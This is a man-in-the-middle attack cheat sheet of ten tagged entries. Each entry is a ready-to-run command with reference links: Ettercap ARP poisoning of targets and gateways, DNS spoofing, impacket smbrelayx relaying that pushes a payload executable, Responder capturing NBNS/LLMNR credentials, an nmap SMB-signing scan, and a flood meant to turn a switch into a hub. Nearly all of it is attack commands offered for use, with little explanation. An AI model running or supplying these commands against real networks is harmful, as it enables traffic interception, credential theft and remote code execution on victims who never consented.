### 1. Ettercap arp poisoning
```
ettercap -M arp -T -i em1 -L log /[TARGET]//
```
**- linux,networking,MitM**
#### References:

https://ettercap.github.io/ettercap/
__________
### 2. ARP Spoofing filter
```
etterfilter *.filter -o smb.ef
```
**- linux,networking,MitM**
#### References:

https://ettercap.github.io/ettercap/
http://www.thegeekstuff.com/2012/05/ettercap-tutorial
__________
### 3. ARP Spoofing gateway
```
ettercap -i em1 -L etter.log -T -M arp:remote /192.168.104.254/// ////
```
**- linux,networking,MitM**
#### References:

https://ettercap.github.io/ettercap/
https://yg.ht
http://www.thegeekstuff.com/2012/05/ettercap-tutorial
__________
### 4. ARP Spoofing everything
```
ettercap -i wlan0 -L etter.log -T -M arp:remote -L [CLIENT+TARGET].log /[GW IP]// /[TARGET IP]//
```
**- linux,networking,MitM,wifi**
#### References:

https://ettercap.github.io/ettercap/
https://yg.ht
http://www.thegeekstuff.com/2012/05/ettercap-tutorial
__________
### 5. ARP Spoofing DNS
```
ettercap -i [interface] -L etter.log -T -P dns_spoof -M arp:remote -L [CLIENT+TARGET].log /[GW IP]// /[TARGET IP]//
```
**- linux,networking,MitM,wifi**
#### References:

https://ettercap.github.io/ettercap/
https://yg.ht
http://www.thegeekstuff.com/2012/05/ettercap-tutorial
__________
### 6. smbrelay targeted
```
smbrelayx.py -h [TARGETIP] -e [PAYLOAD exe]
```
**- linux,smb,MitM,Windows,impacket,privilege escalation**
#### References:

https://www.coresecurity.com/corelabs-research/open-source-tools/impacket
__________
### 7. smbrelay reflection : note read into http -> smb refelction
```
smbrelayx.py -e [PAYLOAD exe]
```
**- linux,smb,MitM,Windows,impacket,privilege escalation**
#### References:

https://www.coresecurity.com/corelabs-research/open-source-tools/impacket
__________
### 8. responder NBNS LLMNR
```
/data/hacking/Responder/Responder.py -I eth0 -wrfFd --lm -i [YOUR IP]
```
**- linux,passwords,smb,MitM,privilege escalation**
#### References:

https://github.com/SpiderLabs/Responder
https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/
__________
### 9. nmap smb signing
```
nmap --script smb-security-mode.nse -p445 -iL [hostsfile] -oA nmap-SMBSigning
```
**- linux,networking,scanning,smb,MitM**
#### References:

https://nmap.org/book/man-examples.html
https://highon.coffee/blog/nmap-cheat-sheet/
https://www.cyberciti.biz/networking/nmap-command-examples-tutorials/
__________
### 10. try to make the switch fall over, and turn into a hub
```
ettercap -TP rand_flood
```
**- linux,MitM**
#### References:

https://linux.die.net/man/8/ettercap_plugins
__________
